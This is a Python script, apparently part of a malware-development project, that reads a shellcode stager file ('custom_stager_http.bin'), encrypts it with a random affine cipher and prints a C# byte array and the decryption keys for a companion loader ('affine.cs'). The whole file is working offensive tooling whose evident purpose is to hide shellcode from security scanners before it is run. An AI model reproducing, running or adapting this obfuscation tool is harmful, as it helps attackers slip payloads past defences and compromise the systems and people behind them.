'''
This encrypts the shellcode you give it and outputs the key to replace in "affine.cs"

The formula goes as follows: 
1. Define your alphabet (I'm using 0-255 bytes)
2. Assign each character in the alphabet a number (ie. a=1, b=2, c=3, etc...)
3. Pick 1 coprime number with 256
4. Pick any random number (positive values only)

EncryptedIndex = (firstNum * AlphabetNum + secondNum) mod 256

Decrypt formula: 
Decryped = FirstNum^inverseMod * (EncryptedIndex - secondNum) mod 256


NOTE: I need to output the shellcode format for C# (byte[] encrypted = new byte[] { 0xfc, 0x48, 0x83, 0xe4, 0xf0, ...rest of shellcode here } )
'''

import random
import math

# buf = b"\xd2\x65\x48\x8b\x52\x60" # Fake shellcode (if you dont have .bin file)

with open("custom_stager_http.bin", "rb") as f:
    buf = f.read()

# We have to get our "firstNum" value to be coprime with 256
while True:
    a = random.randint(1, 255)
    if math.gcd(a, 256) == 1:
        break
# Then we need that firstNum modulo inverse value
a_inv = pow(a, -1, 256)

# Second number doesnt matter, pick any positive whole number
b = random.randint(1, 256)

# Formula for encrypting, nice clean list comprehension
def encrypt_code(a, buffer, b):
    return [(a * byte + b) % 256 for byte in buffer]

# Formula for decrypting, nice clean list comprehension
def decrypt_code(a_inv, buffer, b):
    return [(a_inv * (byte - b)) % 256 for byte in buffer]


# Run the encryption
encrypted = encrypt_code(a, buf, b)

csharp_format = ", ".join(f"0x{byte:02x}" for byte in encrypted)
print(f"byte[] encrypted = new byte[] {{ {csharp_format} }};")

decrypted = decrypt_code(a_inv, encrypted, b)


print(f"Encrypted: {encrypted}")
print(f"Decrypted: {decrypted}")
print(f"Modular inverse number: {a_inv}")
print(f"Subtraction number: {b}")